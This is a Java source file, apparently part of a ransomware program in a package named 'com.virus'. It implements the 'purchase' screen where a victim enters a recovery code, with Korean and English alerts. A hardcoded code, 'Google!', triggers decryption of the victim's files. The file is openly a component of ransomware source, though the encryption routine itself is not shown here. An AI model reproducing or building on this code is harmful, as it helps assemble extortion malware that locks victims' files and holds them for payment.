package com.virus;

import javafx.concurrent.Task;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.Parent;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.TextField;

import java.io.IOException;

public class PurchaseController {
    @FXML
    private Parent root;
    @FXML
    private TextField txtDecryptCode;
    @FXML
    private Button btnSubmit;

    private static final String CODE = "Google!";

    /**
     * Submit 버튼 이벤트 핸들러
     *
     * @param event
     */
    public void handleSubmitAction(ActionEvent event) throws IOException {
        String code = txtDecryptCode.getText();
        Alert alert;
        if (code.trim().equals("")) {
            alert = new Alert(Alert.AlertType.WARNING);
            alert.setTitle("Warning");
            alert.setHeaderText("복구 코드를 입력해야합니다");
            alert.setContentText("복구 코드를 입력하세요");

            alert.showAndWait();
        } else {
            if (code.equals(CODE)) {
                alert = new Alert(Alert.AlertType.INFORMATION);
                alert.setTitle("Success");
                alert.setHeaderText("Congratulation!");
                alert.setContentText("Recovery code has been confirmed. Starting a decrypted.");
                alert.showAndWait();

                Task<Void> task = new Task<Void>() {
                    @Override
                    protected Void call() throws Exception {
                        Main.encryptionController.decryption();
                        return null;
                    }
                };
                task.setOnRunning(e -> {
                    txtDecryptCode.setDisable(true);
                    btnSubmit.setDisable(true);
                });
                task.setOnSucceeded(e -> {
                    txtDecryptCode.setDisable(false);
                    btnSubmit.setDisable(false);

                    System.exit(0);
                });
                task.setOnFailed(e -> {
                    txtDecryptCode.setDisable(false);
                    btnSubmit.setDisable(false);
                });
                task.setOnCancelled(e -> {
                    txtDecryptCode.setDisable(true);
                    btnSubmit.setDisable(true);
                });
                new Thread(task).start();
            } else {
                alert = new Alert(Alert.AlertType.ERROR);
                alert.setTitle("Fail");
                alert.setHeaderText("Failure recovery");
                alert.setContentText("Invalid code!");
                alert.showAndWait();
            }
        }
    }
}
